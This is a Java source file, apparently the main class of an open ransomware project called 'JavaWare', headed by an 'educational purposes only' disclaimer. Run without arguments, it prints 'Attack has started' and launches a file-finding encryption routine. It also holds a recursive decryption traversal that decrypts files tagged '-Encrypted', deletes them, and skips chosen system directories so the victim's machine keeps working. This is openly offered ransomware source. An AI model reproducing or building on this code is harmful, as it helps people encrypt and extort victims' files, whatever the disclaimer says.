/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
  _ _/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 18/07/19
 Version 2.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/

package RansomeWare;

import java.io.File;
import java.util.*;

public class JavaWare {

    AES aes;
    List<String> avoidDir;

    public JavaWare() {
        aes = new AES();
        
        avoidDir = new AvoidedDir().avoidDir;
    }


    public void DecryptFiles() throws Exception {
    	System.out.println("\nStarting the decryption :)\n");
        String home = "C:\\Users\\ponna\\Desktop\\sai";
        decryptionTraversal(home);

    }

    public void decryptionTraversal(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if(f.isDirectory()) {
                if (avoidDir.contains(f.getName().toLowerCase())) return; //system still works
                decryptionTraversal(f.getAbsolutePath());
            } else {
                String filename = f.getName();
                if(filename.contains("-Encrypted")) {
                    aes.decrypt(f);
                    f.delete();
                }
            }
        }
    }



    public static void main(String[] args) throws Exception {
        JavaWare jw = new JavaWare();
        
        

        if(args.length == 0) {
        	System.out.println("Attack has started");
            
            FindFiles ff = new FindFiles();
            ff.FindFiles();
            
            
            
        } else if(args.length == 1) {
            if(args[0].equals("--encrypt")) {
                FindFiles ff = new FindFiles();
                ff.FindFiles();
                
                
               
            } else if(args[0].equals("--decrypt")) {
            	
                jw.DecryptFiles();
                
            } else {
                System.out.println("Incorrect input, enter --encrypt to encrypt filesystem, or --decrypt to decrypt system.");
            }
        }

    }
}
